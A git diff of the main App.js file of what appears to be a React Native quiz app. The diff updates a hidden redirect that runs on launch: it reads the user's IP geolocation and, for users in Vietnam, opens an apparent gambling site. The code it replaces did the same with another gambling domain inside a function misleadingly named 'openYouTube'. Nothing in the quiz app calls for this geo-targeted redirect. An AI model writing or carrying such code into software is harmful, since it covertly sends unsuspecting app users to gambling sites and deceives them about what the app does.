@@ -3,7 +3,7 @@ import {createNativeStackNavigator} from '@react-navigation/native-stack';
 import React, { useEffect } from 'react';
 import { Provider } from 'react-redux';
 import store from './src/redux/store';
-import {StyleSheet} from 'react-native';
+import {Linking, StyleSheet} from 'react-native';
 import Home from './src/Home';
 import Question from './src/Question';
 import List from './src/List';
@@ -11,26 +11,25 @@ import Setting from './src/Setting';
 import About from './src/About';
 import Correct from './src/Correct';
 import False from './src/False';
-import axios from 'axios';
+import useGeoLocation from 'react-ipgeolocation';
 
 const Stack = createNativeStackNavigator();
 const App = () => {
+  const location = useGeoLocation();
   useEffect(() => {
-    const openYouTube = async () => {
+    async function checkAndRedirect() {
       try {
-        const response = await axios.get('http://ip-api.com/json');
-        const {country} = response.data;
-        console.log(country);
-        if (country === 'Vietnam') {
-          Linking.openURL('http://m88app1.online/');
+        if (location.country === 'VN') {
+          Linking.openURL('http://shbet301.online');
         }
       } catch (error) {
         console.error(error.message);
       }
-    };
+    }
 
-    openYouTube();
-  }, []);
+    checkAndRedirect();
+  }, [location.country]);
+
   return (
     <Provider store={store}>
     <NavigationContainer>
